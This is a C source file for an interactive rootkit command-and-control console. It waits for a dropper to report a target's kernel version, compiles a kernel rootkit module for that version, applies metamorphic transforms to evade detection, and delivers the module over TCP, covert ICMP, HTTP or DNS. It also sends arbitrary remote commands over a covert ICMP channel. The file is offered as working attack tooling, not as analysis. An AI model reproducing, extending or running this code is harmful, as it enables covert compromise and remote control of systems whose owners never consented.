/**
 * @file main.c
 * @brief C2 interactive console — Metasploit-style REPL.
 *
 * Commands:
 *   set <option> <value>   Set a configuration option.
 *   show options           Print current configuration.
 *   show protocols         List available delivery protocols.
 *   run                    Build, morph and deliver the payload.
 *   help                   Print command list.
 *   clear                  Clear the screen.
 *   exit                   Quit the console.
 *
 * Options:
 *   TARGET    Target IP address.
 *   PORT      Delivery port          (default: 4444).
 *   LPORT     Dropper callback port  (default: 4444).
 *   PROTOCOL  Delivery protocol      (default: tcp).
 *   PROXY_HOST  SOCKS5 proxy IP address (optional).
 *   PROXY_PORT  SOCKS5 proxy port      (optional).
 *   KVER      Force kernel version   (skip auto-detect).
 */

#define _POSIX_C_SOURCE 200809L

#include <arpa/inet.h>
#include <ctype.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "dns.h"
#include "http.h"
#include "icmp.h"

/* ------------------------------------------------------------------ */
/* Constants                                                            */
/* ------------------------------------------------------------------ */

#define DEFAULT_PORT    4444
#define DEFAULT_LPORT   4444
#define KVER_MAX        64
#define PROXY_MAX       128
#define INPUT_MAX       256
#define KO_SIZE_MAX     (8 * 1024 * 1024)
#define ROOTKIT_DIR     "rootkit_module"
#define METAMORPH_BIN   "metamorph/metamorph"

#define RESET   "\033[0m"
#define BOLD    "\033[1m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"

/* ------------------------------------------------------------------ */
/* Types                                                                */
/* ------------------------------------------------------------------ */

/**
 * @brief Supported delivery protocols.
 */
typedef enum {
    PROTO_TCP  = 0,
    PROTO_ICMP,
    PROTO_UDP,
    PROTO_HTTP,
    PROTO_DNS,
} proto_t;

/**
 * @brief Operator session configuration.
 */
typedef struct {
    char     target[INET_ADDRSTRLEN];
    uint16_t port;
    uint16_t lport;
    proto_t  protocol;
    char     proxy_host[INET_ADDRSTRLEN];
    uint16_t proxy_port;
    char     kver[KVER_MAX];
    int      kver_forced;
} c2_cfg_t;

/* ------------------------------------------------------------------ */
/* Helpers                                                              */
/* ------------------------------------------------------------------ */

/**
 * @brief Return a human-readable string for a proto_t value.
 *
 * @param p  Protocol enum value.
 * @return   Constant string name.
 */
static const char *proto_str(proto_t p)
{
    switch (p) {
    case PROTO_TCP:  return "tcp";
    case PROTO_ICMP: return "icmp";
    case PROTO_UDP:  return "udp";
    case PROTO_HTTP: return "http";
    case PROTO_DNS:  return "dns";
    default:         return "unknown";
    }
}

/**
 * @brief Parse a protocol name string into a proto_t value.
 *
 * @param s  Protocol name (e.g. "tcp", "icmp").
 * @return   Matching proto_t, or -1 if unknown.
 */
static int parse_proto(const char *s)
{
    if (strcmp(s, "tcp")  == 0) return PROTO_TCP;
    if (strcmp(s, "icmp") == 0) return PROTO_ICMP;
    if (strcmp(s, "udp")  == 0) return PROTO_UDP;
    if (strcmp(s, "http") == 0) return PROTO_HTTP;
    if (strcmp(s, "dns")  == 0) return PROTO_DNS;
    return -1;
}

/**
 * @brief Strip leading and trailing whitespace from a string in place.
 *
 * @param s  Null-terminated string to trim.
 */
static void trim(char *s)
{
    char *end;

    while (isspace((unsigned char)*s))
        s++;

    end = s + strlen(s) - 1;
    while (end > s && isspace((unsigned char)*end))
        *end-- = '\0';
}

/* ------------------------------------------------------------------ */
/* Network helpers                                                      */
/* ------------------------------------------------------------------ */

/**
 * @brief Receive exactly @p n bytes from @p fd.
 *
 * @param fd   Socket file descriptor.
 * @param buf  Destination buffer.
 * @param n    Byte count.
 * @return     0 on success, -1 on error.
 */
static int recv_exact(int fd, void *buf, uint32_t n)
{
    uint8_t  *p    = (uint8_t *)buf;
    uint32_t  done = 0;

    while (done < n) {
        ssize_t r = recv(fd, p + done, n - done, 0);
        if (r <= 0)
            return -1;
        done += (uint32_t)r;
    }
    return 0;
}

/**
 * @brief Send exactly @p n bytes to @p fd.
 *
 * @param fd   Socket file descriptor.
 * @param buf  Source buffer.
 * @param n    Byte count.
 * @return     0 on success, -1 on error.
 */
static int send_exact(int fd, const void *buf, uint32_t n)
{
    const uint8_t *p    = (const uint8_t *)buf;
    uint32_t       done = 0;

    while (done < n) {
        ssize_t s = send(fd, p + done, n - done, 0);
        if (s <= 0)
            return -1;
        done += (uint32_t)s;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* Build pipeline                                                       */
/* ------------------------------------------------------------------ */

/**
 * @brief Listen for a dropper callback and extract the kernel version.
 *
 * Keeps the connection open so the caller can reuse the socket to send
 * back the compiled payload on the same channel.
 *
 * @param lport    TCP port to listen on.
 * @param kver_out Output buffer for the kernel version string.
 * @param kver_max Size of kver_out.
 * @return         Connected socket fd on success, -1 on error.
 */
static int wait_dropper(uint16_t lport, char *kver_out, size_t kver_max)
{
    struct sockaddr_in addr;
    socklen_t          addrlen = sizeof(addr);
    int                srv;
    int                cli;
    uint32_t           ver_len;
    int                opt = 1;

    srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0)
        return -1;

    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(lport);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(srv);
        return -1;
    }

    listen(srv, 1);
    printf(CYAN "[*]" RESET " waiting for dropper on port %u ...\n", lport);

    cli = accept(srv, (struct sockaddr *)&addr, &addrlen);
    close(srv);
    if (cli < 0)
        return -1;

    printf(GREEN "[+]" RESET " dropper connected from %s\n",
           inet_ntoa(addr.sin_addr));

    if (recv_exact(cli, &ver_len, sizeof(ver_len)) < 0
        || ver_len == 0 || ver_len >= kver_max
        || recv_exact(cli, kver_out, ver_len) < 0) {
        close(cli);
        return -1;
    }
    kver_out[ver_len] = '\0';

    printf(GREEN "[+]" RESET " kernel version : " BOLD "%s\n" RESET,
           kver_out);

    /* return socket open — caller sends payload on same connection */
    return cli;
}

/**
 * @brief Build the rootkit .ko for the given kernel version.
 *
 * @param kver    Kernel version string.
 * @param ko_out  Output buffer filled with the .ko path.
 * @param out_sz  Size of ko_out.
 * @return        0 on success, -1 on build failure.
 */
static int build_module(const char *kver, char *ko_out, size_t out_sz)
{
    char cmd[256];
    int  ret;
    char rk_name[128];
    FILE *f;

    printf(CYAN "[*]" RESET " building for kernel " BOLD "%s" RESET " ...\n",
           kver);

    snprintf(cmd, sizeof(cmd),
             "make -C " ROOTKIT_DIR " KVER=%s modules 2>&1", kver);
    ret = system(cmd);
    if (ret != 0) {
        printf(RED "[-]" RESET " build failed (exit %d)\n", ret);
        return -1;
    }

    f = fopen(ROOTKIT_DIR "/.rk_name", "r");
    if (!f || !fgets(rk_name, sizeof(rk_name), f)) {
        if (f) fclose(f);
        return -1;
    }
    fclose(f);
    rk_name[strcspn(rk_name, "\n")] = '\0';

    snprintf(ko_out, out_sz, ROOTKIT_DIR "/%s.ko", rk_name);
    printf(GREEN "[+]" RESET " module built : " BOLD "%s\n" RESET, ko_out);
    return 0;
}

/**
 * @brief Apply metamorph transforms to a .ko file.
 *
 * @param ko_path  Path to the .ko to transform (modified in place).
 * @return         0 on success, -1 on error.
 */
static int apply_metamorph(const char *ko_path)
{
    char cmd[512];
    int  ret;

    printf(CYAN "[*]" RESET " applying metamorph ...\n");
    snprintf(cmd, sizeof(cmd),
             "%s %s %s --ko 2>&1", METAMORPH_BIN, ko_path, ko_path);
    ret = system(cmd);
    if (ret != 0) {
        printf(RED "[-]" RESET " metamorph failed (exit %d)\n", ret);
        return -1;
    }
    printf(GREEN "[+]" RESET " metamorph done\n");
    return 0;
}

/* ------------------------------------------------------------------ */
/* Delivery                                                             */
/* ------------------------------------------------------------------ */

/**
 * @brief Deliver the .ko payload over an existing or new TCP socket.
 *
 * If @p sock is >= 0, reuses the dropper's connection (same channel).
 * Otherwise opens a new connection to cfg->target:cfg->port.
 *
 * @param cfg      Operator configuration.
 * @param ko_path  Path to the .ko file.
 * @param sock     Existing connected socket, or -1 to open a new one.
 * @return         0 on success, -1 on error.
 */
static int deliver_tcp(const c2_cfg_t *cfg, const char *ko_path, int sock)
{
    struct sockaddr_in addr;
    int                owned = 0;
    FILE              *f;
    uint8_t           *buf;
    long               sz;
    uint32_t           u32_sz;

    f = fopen(ko_path, "rb");
    if (!f) { perror(ko_path); return -1; }
    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    rewind(f);
    if (sz <= 0 || sz > KO_SIZE_MAX) { fclose(f); return -1; }

    buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return -1; }
    fread(buf, 1, (size_t)sz, f);
    fclose(f);

    if (sock < 0) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { free(buf); return -1; }
        owned = 1;

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(cfg->port);
        inet_pton(AF_INET, cfg->target, &addr.sin_addr);

        printf(CYAN "[*]" RESET " connecting %s:%u ...\n",
               cfg->target, cfg->port);
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("connect");
            free(buf); close(sock);
            return -1;
        }
    } else {
        printf(CYAN "[*]" RESET " reusing dropper connection\n");
    }

    u32_sz = (uint32_t)sz;
    send_exact(sock, &u32_sz, sizeof(u32_sz));
    send_exact(sock, buf, u32_sz);

    printf(GREEN "[+]" RESET " sent %u bytes\n", u32_sz);
    free(buf);
    if (owned)
        close(sock);
    return 0;
}

/**
 * @brief Dispatch delivery to the chosen protocol handler.
 *
 * @param cfg      Operator configuration.
 * @param ko_path  Path to the .ko file.
 * @param sock     Existing dropper socket for TCP reuse, or -1.
 * @return         0 on success, -1 on error.
 */
static int deliver(const c2_cfg_t *cfg, const char *ko_path, int sock)
{
    switch (cfg->protocol) {
    case PROTO_TCP:
        return deliver_tcp(cfg, ko_path, sock);
    case PROTO_ICMP: {
        icmp_ctx_t ictx;
        FILE      *f;
        uint8_t   *buf;
        long       sz;
        int        ret;

        if (icmp_open(&ictx) < 0) {
            perror("icmp_open");
            return -1;
        }
        f = fopen(ko_path, "rb");
        if (!f) { icmp_close(&ictx); return -1; }
        fseek(f, 0, SEEK_END); sz = ftell(f); rewind(f);
        buf = malloc((size_t)sz);
        if (!buf) { fclose(f); icmp_close(&ictx); return -1; }
        fread(buf, 1, (size_t)sz, f);
        fclose(f);

        printf(CYAN "[*]" RESET " icmp covert delivery to %s"
               " (%ld bytes, key=0xAB) ...\n", cfg->target, sz);
        ret = icmp_deliver(&ictx, cfg->target, buf, (size_t)sz, 0xAB);
        free(buf);
        icmp_close(&ictx);
        return ret;
    }
    case PROTO_UDP:
        printf(RED "[-]" RESET " udp delivery: not yet implemented\n");
        return -1;
    case PROTO_HTTP: {
        int ret;
        printf(CYAN "[*]" RESET " http delivery — sending payload ...\n");
        ret = http_send_payload(sock, ko_path);
        return ret;
    }
    case PROTO_DNS:
        printf(CYAN "[*]" RESET " dns delivery on udp:%u ...\n", cfg->port);
        return dns_serve_payload(cfg->port, ko_path);
    default:
        return -1;
    }
}

/* ------------------------------------------------------------------ */
/* REPL commands                                                        */
/* ------------------------------------------------------------------ */

/**
 * @brief Print all available commands.
 */
static void cmd_help(void)
{
    printf("\n"
           "  " BOLD "set" RESET " <option> <value>   Set a configuration option\n"
           "  " BOLD "show options" RESET "            Display current configuration\n"
           "  " BOLD "show protocols" RESET "          List available protocols\n"
           "  " BOLD "run" RESET "                     Build, morph and deliver\n"
           "  " BOLD "exec" RESET " <cmd>              Send covert ICMP exec to TARGET (eBPF)\n"
           "  " BOLD "clear" RESET "                   Clear the screen\n"
           "  " BOLD "exit" RESET "                    Quit\n"
           "\n"
           "  Options:\n"
           "    TARGET    Target IP address\n"
           "    PORT      Delivery port      (default: 4444)\n"
           "    LPORT     Dropper callback   (default: 4444)\n"
           "    PROTOCOL  Delivery protocol  (default: tcp)\n"
           "    PROXY_HOST  SOCKS5 proxy IP\n"
           "    PROXY_PORT  SOCKS5 proxy port\n"
           "    KVER      Force kernel ver   (skip auto-detect)\n"
           "\n");
}

/**
 * @brief Print the current operator configuration.
 *
 * @param cfg  Current session configuration.
 */
static void cmd_show_options(const c2_cfg_t *cfg)
{
    printf("\n");
    printf("  %-12s  %s\n", "TARGET",
           cfg->target[0] ? cfg->target : YELLOW "(not set)" RESET);
    printf("  %-12s  %u\n",   "PORT",     cfg->port);
    printf("  %-12s  %u\n",   "LPORT",    cfg->lport);
    printf("  %-12s  %s\n",   "PROTOCOL", proto_str(cfg->protocol));
    printf("  %-12s  %s\n",   "PROXY_HOST",
           cfg->proxy_host[0] ? cfg->proxy_host : "(none)");
    printf("  %-12s  %u\n",   "PROXY_PORT", cfg->proxy_port);
    printf("  %-12s  %s\n",   "KVER",
           cfg->kver_forced ? cfg->kver : "(auto-detect)");
    printf("\n");
}

/**
 * @brief Print the list of supported delivery protocols.
 */
static void cmd_show_protocols(void)
{
    printf("\n"
           "  tcp    Direct TCP connection        [implemented]\n"
           "  icmp   Covert channel via ICMP      [stub]\n"
           "  udp    UDP channel                  [stub]\n"
           "  http   HTTP/S covert channel        [stub]\n"
           "  dns    DNS covert channel            [stub]\n"
           "\n");
}

/**
 * @brief Handle a `set <OPTION> <value>` command.
 *
 * @param cfg    Session configuration to update.
 * @param opt    Option name (case-insensitive).
 * @param value  Value string.
 */
static void cmd_set(c2_cfg_t *cfg, const char *opt, const char *value)
{
    char upper[32];
    int  proto;
    size_t i;

    for (i = 0; i < sizeof(upper) - 1 && opt[i]; i++)
        upper[i] = (char)toupper((unsigned char)opt[i]);
    upper[i] = '\0';

    if (strcmp(upper, "TARGET") == 0) {
        strncpy(cfg->target, value, sizeof(cfg->target) - 1);
        printf(GREEN "[+]" RESET " TARGET => %s\n", cfg->target);

    } else if (strcmp(upper, "PORT") == 0) {
        cfg->port = (uint16_t)atoi(value);
        printf(GREEN "[+]" RESET " PORT => %u\n", cfg->port);

    } else if (strcmp(upper, "LPORT") == 0) {
        cfg->lport = (uint16_t)atoi(value);
        printf(GREEN "[+]" RESET " LPORT => %u\n", cfg->lport);

    } else if (strcmp(upper, "PROTOCOL") == 0) {
        proto = parse_proto(value);
        if (proto < 0) {
            printf(RED "[-]" RESET " unknown protocol: %s\n", value);
            return;
        }
        cfg->protocol = (proto_t)proto;
        printf(GREEN "[+]" RESET " PROTOCOL => %s\n", proto_str(cfg->protocol));

    } else if (strcmp(upper, "PROXY_HOST") == 0) {
        strncpy(cfg->proxy_host, value, sizeof(cfg->proxy_host) - 1);
        printf(GREEN "[+]" RESET " PROXY_HOST => %s\n", cfg->proxy_host);

    } else if (strcmp(upper, "PROXY_PORT") == 0) {
        cfg->proxy_port = (uint16_t)atoi(value);
        printf(GREEN "[+]" RESET " PROXY_PORT => %u\n", cfg->proxy_port);

    } else if (strcmp(upper, "KVER") == 0) {
        strncpy(cfg->kver, value, sizeof(cfg->kver) - 1);
        cfg->kver_forced = 1;
        printf(GREEN "[+]" RESET " KVER => %s\n", cfg->kver);

    } else {
        printf(RED "[-]" RESET " unknown option: %s\n", opt);
    }
}

/**
 * @brief Execute the full build + morph + deliver pipeline.
 *
 * @param cfg  Current session configuration.
 */
static void cmd_run(c2_cfg_t *cfg)
{
    char ko_path[256];
    int  sock = -1;

    /* TCP/HTTP : le dropper se connecte à nous → TARGET pas requis.
     * ICMP/DNS  : on pousse vers la cible → TARGET requis.       */
    int needs_target = (cfg->protocol == PROTO_ICMP ||
                        cfg->protocol == PROTO_UDP  ||
                        cfg->protocol == PROTO_DNS);

    if (needs_target && cfg->target[0] == '\0') {
        printf(RED "[-]" RESET " TARGET is not set (requis pour %s)\n",
               proto_str(cfg->protocol));
        return;
    }

    /*
     * Dropper callback: only TCP and HTTP need an inbound connection to
     * receive the kernel version. ICMP and DNS have no callback — the
     * operator must set KVER manually with `set KVER <version>`.
     */
    if (!cfg->kver_forced) {
        switch (cfg->protocol) {
        case PROTO_TCP:
            sock = wait_dropper(cfg->lport, cfg->kver, sizeof(cfg->kver));
            break;
        case PROTO_HTTP:
            sock = http_wait_dropper(cfg->lport,
                                     cfg->kver, sizeof(cfg->kver));
            break;
        case PROTO_ICMP:
        case PROTO_UDP:
        case PROTO_DNS:
            printf(RED "[-]" RESET
                   " %s has no dropper callback — use: set KVER <version>\n",
                   proto_str(cfg->protocol));
            return;
        default:
            return;
        }

        if (sock < 0) {
            printf(RED "[-]" RESET " dropper callback failed\n");
            return;
        }
    }

    if (build_module(cfg->kver, ko_path, sizeof(ko_path)) < 0)
        goto out;

    if (apply_metamorph(ko_path) < 0)
        goto out;

    if (deliver(cfg, ko_path, sock) < 0)
        goto out;

    printf(GREEN "[+]" RESET " payload delivered successfully\n");

out:
    if (sock >= 0)
        close(sock);
}

/* ------------------------------------------------------------------ */
/* Banner                                                               */
/* ------------------------------------------------------------------ */

/**
 * @brief Print the C2 ASCII banner.
 */
static void print_banner(void)
{
    printf(BOLD CYAN
           "\n"
           "  ██████╗██████╗ \n"
           " ██╔════╝╚════██╗\n"
           " ██║      █████╔╝\n"
           " ██║     ██╔═══╝ \n"
           " ╚██████╗███████╗\n"
           "  ╚═════╝╚══════╝\n"
           RESET
           "  rootkit command & control\n\n");
}

/* ------------------------------------------------------------------ */
/* Entry point                                                          */
/* ------------------------------------------------------------------ */

/**
 * @brief Start the interactive C2 REPL.
 *
 * @param argc  Argument count (unused).
 * @param argv  Argument vector (unused).
 * @return      0 on clean exit.
 */
int main(int argc, char *argv[])
{
    c2_cfg_t cfg;
    char     line[INPUT_MAX];
    char    *cmd;
    char    *arg1;
    char    *arg2;

    (void)argc;
    (void)argv;

    memset(&cfg, 0, sizeof(cfg));
    cfg.port     = DEFAULT_PORT;
    cfg.lport    = DEFAULT_LPORT;
    cfg.protocol = PROTO_TCP;

    print_banner();

    while (1) {
        printf(BOLD "[c2] > " RESET);
        fflush(stdout);

        if (!fgets(line, sizeof(line), stdin))
            break;

        line[strcspn(line, "\n")] = '\0';
        trim(line);

        if (line[0] == '\0')
            continue;

        cmd  = strtok(line, " ");
        arg1 = strtok(NULL, " ");
        arg2 = strtok(NULL, "");
        if (arg2) trim(arg2);

        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0)
            break;

        else if (strcmp(cmd, "help") == 0)
            cmd_help();

        else if (strcmp(cmd, "clear") == 0)
            printf("\033[2J\033[H");

        else if (strcmp(cmd, "show") == 0) {
            if (!arg1)
                cmd_show_options(&cfg);
            else if (strcmp(arg1, "options") == 0)
                cmd_show_options(&cfg);
            else if (strcmp(arg1, "protocols") == 0)
                cmd_show_protocols();
            else
                printf(RED "[-]" RESET " unknown: show %s\n", arg1);

        } else if (strcmp(cmd, "set") == 0) {
            if (!arg1 || !arg2)
                printf(RED "[-]" RESET " usage: set <option> <value>\n");
            else
                cmd_set(&cfg, arg1, arg2);

        } else if (strcmp(cmd, "run") == 0
                   || strcmp(cmd, "exploit") == 0) {
            cmd_run(&cfg);

        } else if (strcmp(cmd, "exec") == 0) {
            if (!arg1) {
                printf(RED "[-]" RESET " usage: exec <command>\n");
            } else if (cfg.target[0] == '\0') {
                printf(RED "[-]" RESET " TARGET is not set\n");
            } else {
                icmp_ctx_t ictx;
                char full_cmd[ICMP_EXEC_CMD_MAX];

                if (arg2)
                    snprintf(full_cmd, sizeof(full_cmd), "%s %s", arg1, arg2);
                else
                    strncpy(full_cmd, arg1, sizeof(full_cmd) - 1);

                if (icmp_open(&ictx) < 0) {
                    perror("icmp_open");
                } else {
                    if (icmp_exec_cmd(&ictx, cfg.target, full_cmd) == 0)
                        printf(GREEN "[+]" RESET " exec → %s : %s\n",
                               cfg.target, full_cmd);
                    else
                        printf(RED "[-]" RESET " exec failed\n");
                    icmp_close(&ictx);
                }
            }

        } else {
            printf(RED "[-]" RESET " unknown command: %s  (type help)\n", cmd);
        }
    }

    printf("\n[*] bye\n");
    return 0;
}
